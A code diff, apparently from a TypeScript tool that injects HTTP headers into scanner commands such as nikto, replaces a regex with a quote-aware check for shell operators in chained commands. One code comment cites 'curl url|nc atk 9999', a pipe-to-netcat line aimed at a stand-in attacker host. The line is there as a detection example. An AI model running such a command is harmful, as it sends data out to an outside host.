@@ -344,7 +344,11 @@ const injectNikto: ShellInjector = (command, headers) => {
     lines.push(`${name}: ${value}`);
   }
   if (lines.length === 0) return command;
-  const arg = `-headers "${shellQuote(lines.join("\n"))}"`;
+  // Use the literal two-character escape `\n`, not a 0x0A byte. Nikto
+  // interprets `\n` as the header separator, and embedding a raw newline
+  // in the shell command would split it across lines in persistent /
+  // line-based shells. Mirrors the sqlmap injector above.
+  const arg = `-headers "${shellQuote(lines.join("\\n"))}"`;
   return command.replace(/(\bnikto\b)/, `$1 ${arg}`);
 };
 
@@ -375,9 +379,44 @@ const shellInjectorRegistry: ReadonlyMap<string, ShellInjector> = new Map<
 // Shell command header injection
 // ---------------------------------------------------------------------------
 
-const COMMAND_SPLIT = /(?:^|\s)(?:[;&|]{1,2})/;
 const COMMAND_PREFIX_STRIP =
   /^\s*(?:sudo\s+(?:-[^\s]*\s+)*|timeout\s+\S+\s+|env\s+(?:\S+=\S+\s+)+|nohup\s+)+/;
+
+/**
+ * True iff the command contains a shell control operator (`;`, `&`, `|`,
+ * or any doubled form) outside single/double quotes. A regex on its own
+ * cannot do this safely — either it requires whitespace before the
+ * operator (and misses `curl url|nc atk 9999`) or it matches operators
+ * inside quoted argument values (`curl -H "X: a|b" url`). So we walk
+ * the string and respect quote state.
+ *
+ * Backslash escapes a single following character outside single quotes
+ * (POSIX rule). Inside single quotes nothing is escaped — the only way
+ * out is a closing `'`.
+ */
+function hasShellOperatorOutsideQuotes(command: string): boolean {
+  let inSingle = false;
+  let inDouble = false;
+  for (let i = 0; i < command.length; i++) {
+    const ch = command[i];
+    if (!inSingle && ch === "\\" && i + 1 < command.length) {
+      i++; // skip the escaped character
+      continue;
+    }
+    if (!inDouble && ch === "'") {
+      inSingle = !inSingle;
+      continue;
+    }
+    if (!inSingle && ch === '"') {
+      inDouble = !inDouble;
+      continue;
+    }
+    if (!inSingle && !inDouble) {
+      if (ch === ";" || ch === "&" || ch === "|") return true;
+    }
+  }
+  return false;
+}
 
 /**
  * Extract the leading tool name from a command line, stripping common
@@ -385,7 +424,7 @@ const COMMAND_PREFIX_STRIP =
  * for pipelined / chained commands or empty input.
  */
 function extractLeadingTool(command: string): string | null {
-  if (COMMAND_SPLIT.test(` ${command}`)) return null;
+  if (hasShellOperatorOutsideQuotes(command)) return null;
   const stripped = command.replace(COMMAND_PREFIX_STRIP, "");
   const firstWord = stripped.trim().split(/\s+/)[0];
   return firstWord || null;
